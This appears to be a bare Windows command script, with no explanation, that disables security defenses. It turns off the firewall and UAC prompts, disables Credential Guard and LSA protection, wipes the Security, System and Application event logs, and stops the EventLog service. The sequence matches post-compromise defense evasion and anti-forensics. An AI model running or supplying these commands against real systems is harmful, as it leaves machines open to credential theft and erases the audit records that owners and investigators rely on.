# Firewall
netsh advfirewall set allprofiles state off

# UAC
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f

# Credential Guard / LSA Protection
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCredentialGuard /t REG_DWORD /d 1 /f

# Event logging (clear + disable)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
Set-Service EventLog -StartupType Disabled -ErrorAction SilentlyContinue
Stop-Service EventLog -Force -ErrorAction SilentlyContinue